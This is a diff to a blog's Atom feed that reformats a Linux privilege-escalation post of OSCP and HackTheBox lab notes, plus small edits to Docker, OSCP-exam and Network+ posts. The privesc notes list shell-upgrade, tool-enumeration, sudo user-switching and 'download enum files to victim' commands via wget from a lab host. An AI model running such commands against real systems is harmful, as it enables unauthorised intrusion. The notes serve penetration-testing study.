@@ -185,27 +185,23 @@ docker-compose down
 &lt;span class="c1"&gt;# Must be in same folder as docker-compose.yml&lt;/span&gt;
 docker-compose ps
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="Docker"></category><category term="Docker"></category></entry><entry><title>"Linux Privilege Escalation"</title><link href="/linux-privilege-escalation.html" rel="alternate"></link><published>2019-11-01T00:00:00-05:00</published><updated>2019-11-01T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-11-01:/linux-privilege-escalation.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;privesc_linux&lt;/span&gt;
-&lt;span class="n"&gt;UPGRADE&lt;/span&gt; &lt;span class="n"&gt;SHELL&lt;/span&gt; &lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="err"&gt;‘&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pty&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;pty&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;spawn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="err"&gt;’&lt;/span&gt;
+&lt;span class="n"&gt;UPGRADE&lt;/span&gt; &lt;span class="n"&gt;SHELL&lt;/span&gt; &lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;import pty; pty.spawn(&amp;quot;bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;
 &lt;span class="n"&gt;ctrl&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Z&lt;/span&gt;
 &lt;span class="n"&gt;stty&lt;/span&gt; &lt;span class="n"&gt;raw&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;echo&lt;/span&gt;
 &lt;span class="n"&gt;fg&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Enumerate and run this:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2&amp;gt;/dev/null&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
+&lt;p&gt;&lt;code&gt;which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;If you don’t see a compiler such as GCC …&lt;/p&gt;</summary><content type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;privesc_linux&lt;/span&gt;
-&lt;span class="n"&gt;UPGRADE&lt;/span&gt; &lt;span class="n"&gt;SHELL&lt;/span&gt; &lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="err"&gt;‘&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pty&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;pty&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;spawn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="err"&gt;’&lt;/span&gt;
+&lt;span class="n"&gt;UPGRADE&lt;/span&gt; &lt;span class="n"&gt;SHELL&lt;/span&gt; &lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;import pty; pty.spawn(&amp;quot;bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;
 &lt;span class="n"&gt;ctrl&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Z&lt;/span&gt;
 &lt;span class="n"&gt;stty&lt;/span&gt; &lt;span class="n"&gt;raw&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;echo&lt;/span&gt;
 &lt;span class="n"&gt;fg&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Enumerate and run this:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2&amp;gt;/dev/null&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
+&lt;p&gt;&lt;code&gt;which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;If you don’t see a compiler such as GCC, you know it’s probably not going to be a kernel exploit. So enumerate and use
 LinEnum.sh or Linuxprivescchecker.py. I found on one of my 20 point boxes it only perl and wget, so I was looking for priv esc
 related to perl. The other 20 pointer had GCC, so I googled a linux exploit, 2 minutes later I am root.
@@ -218,11 +214,9 @@ BY HAND
 6. ps aux | grep root == john mysql -u root
 7. If webserver poke around database
 8. Look at original nmap scan for other shite running (nmap localhost)&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;sudo -u anotheruser command run sommand as another user&lt;/span&gt;
-&lt;span class="err"&gt;sudo -u scriptmanager bash -i #run shell as user scriptmanager&lt;/span&gt;
-&lt;span class="err"&gt;which awk perl python ruby gcc cc vi vim nmap find netcat nc wget curl tftp ftp 2&amp;gt;/dev/null&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
+&lt;p&gt;&lt;code&gt;sudo -u anotheruser command run sommand as another user
+sudo -u scriptmanager bash -i #run shell as user scriptmanager
+which awk perl python ruby gcc cc vi vim nmap find netcat nc wget curl tftp ftp 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;DOWNLOAD ALL LINUX ENUM FILES TO VICTIM cd /opt/linux_privesc
 python -m SimpleHTTPServer
 wget -r 10.10.14.7:8000
@@ -1703,7 +1697,7 @@ The attitude was so different for each exam. For the first two attempts I was ex
 &lt;li&gt;CherryTree Notes on HackTheBox and BufferOverflow&lt;/li&gt;
 &lt;li&gt;A later exam start with some planned sleep.&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;The OSCP logo of the shadowy suited guy in the doorway that you get on your OSCP card is so lame. &lt;/p&gt;</content><category term="OSCP"></category><category term="Penetration Testing"></category></entry><entry><title>Network+: Network Models</title><link href="/network-models.html" rel="alternate"></link><published>2019-10-24T16:20:02-05:00</published><updated>2019-10-24T16:20:02-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-24:/network-models.html</id><summary type="html">&lt;p&gt;What does your post talk about? Write here.&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Network Models&lt;/h2&gt;
+&lt;p&gt;The OSCP logo of the shadowy suited guy in the doorway that you get on your OSCP card is so lame. &lt;/p&gt;</content><category term="OSCP"></category><category term="Penetration Testing"></category></entry><entry><title>Network+: Network Models</title><link href="/network-models.html" rel="alternate"></link><published>2019-10-24T16:20:02-05:00</published><updated>2019-10-24T16:20:02-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-24:/network-models.html</id><summary type="html">&lt;p&gt;CompTIA Network+&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Network Models&lt;/h2&gt;
 &lt;p&gt;There are two main models that represent networks. The OSI and TCP/IP Model.&lt;/p&gt;
 &lt;h3&gt;OSI Model&lt;/h3&gt;
 &lt;ol&gt;
